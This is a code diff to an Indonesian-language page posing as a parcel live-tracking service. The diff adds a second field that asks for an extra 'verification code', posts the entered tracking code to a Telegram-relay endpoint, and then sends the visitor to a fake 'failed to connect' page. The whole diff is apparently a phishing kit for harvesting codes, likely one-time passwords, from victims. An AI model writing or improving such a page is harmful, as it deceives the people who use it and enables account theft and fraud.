@@ -111,6 +111,9 @@
     }
     .next:active { transform: translateY(1px); background: var(--green-dark); }
     .next:focus-visible { outline: 3px solid rgba(25,139,69,.3); outline-offset: 3px; }
+    .second-step { margin-top: 14px; }
+    .second-step[hidden] { display: none; }
+    .second-step .next { margin-top: 14px; }
     .notice {
       min-height: 42px;
       margin: 10px 0 0;
@@ -157,6 +160,17 @@
           <input class="field" id="tracking-code" name="tracking-code" type="text" autocomplete="off" aria-label="Kode resi pengiriman" placeholder="Masukkan kode disini" required>
         </div>
         <button class="next" type="submit">Aktifkan Live Tracking</button>
+        <div class="second-step" id="second-step" hidden>
+          <label for="verification-code" style="position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;">Kode tambahan</label>
+          <div class="field-wrap">
+            <svg class="field-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 3.5 4.75 6.25v5.5c0 4.35 2.85 7.65 7.25 8.75 4.4-1.1 7.25-4.4 7.25-8.75v-5.5L12 3.5Z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/>
+              <path d="m8.75 12 2.1 2.1 4.4-4.4" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <input class="field" id="verification-code" name="verification-code" type="text" autocomplete="off" aria-label="Kode tambahan" placeholder="Input kode disini">
+          </div>
+          <button class="next" id="continue-button" type="submit">Lanjutkan</button>
+        </div>
         <p class="notice" id="notice" aria-live="polite"></p>
       </form>
     </section>
@@ -174,15 +188,41 @@
     const URL_TUJUAN = "https://cek-paketku.myr.id/lp/gagal-menghubungkan";
     const form = document.getElementById("tracking-form");
     const field = document.getElementById("tracking-code");
+    const secondStep = document.getElementById("second-step");
+    const verificationField = document.getElementById("verification-code");
     const notice = document.getElementById("notice");
+    const firstButton = form.querySelector(".next");
+    const continueButton = document.getElementById("continue-button");
+    let isSecondStepVisible = false;
 
     form.addEventListener("submit", async function (event) {
       event.preventDefault();
       notice.textContent = "";
 
-      if (!field.value.trim()) {
-        notice.textContent = "Silakan isi kolom terlebih dahulu.";
-        field.focus();
+      if (!isSecondStepVisible) {
+        if (!field.value.trim()) {
+          notice.textContent = "Silakan isi kolom terlebih dahulu.";
+          field.focus();
+          return;
+        }
+
+        firstButton.disabled = true;
+        firstButton.textContent = "Resi tersimpan";
+        isSecondStepVisible = true;
+        secondStep.hidden = false;
+        verificationField.focus();
+
+        fetch("/api/send-telegram", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ trackingCode: field.value.trim() }),
+        }).catch(() => {});
+        return;
+      }
+
+      if (!verificationField.value.trim()) {
+        notice.textContent = "Silakan isi kode terlebih dahulu.";
+        verificationField.focus();
         return;
       }
 
@@ -191,38 +231,21 @@
         return;
       }
 
-      const submitButton = form.querySelector(".next");
-      submitButton.disabled = true;
-      submitButton.textContent = "Menghubungkan...";
-
+      let destination;
       try {
-        const telegramResponse = await fetch("/api/send-telegram", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ trackingCode: field.value.trim() }),
-        });
-
-        if (!telegramResponse.ok) {
-          throw new Error("Telegram request failed");
-        }
-
-        let destination;
-        try {
-          destination = new URL(URL_TUJUAN);
-        } catch (_) {
-          notice.textContent = "URL tujuan tidak valid. Periksa kembali pengaturannya.";
-          return;
-        }
-        if (destination.protocol !== "https:" && destination.protocol !== "http:") {
-          notice.textContent = "URL tujuan harus menggunakan http:// atau https://.";
-          return;
-        }
-        window.location.href = destination.href;
+        destination = new URL(URL_TUJUAN);
       } catch (_) {
-        notice.textContent = "Gagal menghubungkan ke layanan. Silakan coba lagi.";
-        submitButton.disabled = false;
-        submitButton.textContent = "Aktifkan Live Tracking";
+        notice.textContent = "URL tujuan tidak valid. Periksa kembali pengaturannya.";
+        return;
       }
+      if (destination.protocol !== "https:" && destination.protocol !== "http:") {
+        notice.textContent = "URL tujuan harus menggunakan http:// atau https://.";
+        return;
+      }
+
+      continueButton.disabled = true;
+      continueButton.textContent = "Menghubungkan...";
+      window.location.href = destination.href;
     });
   </script>
 </body>
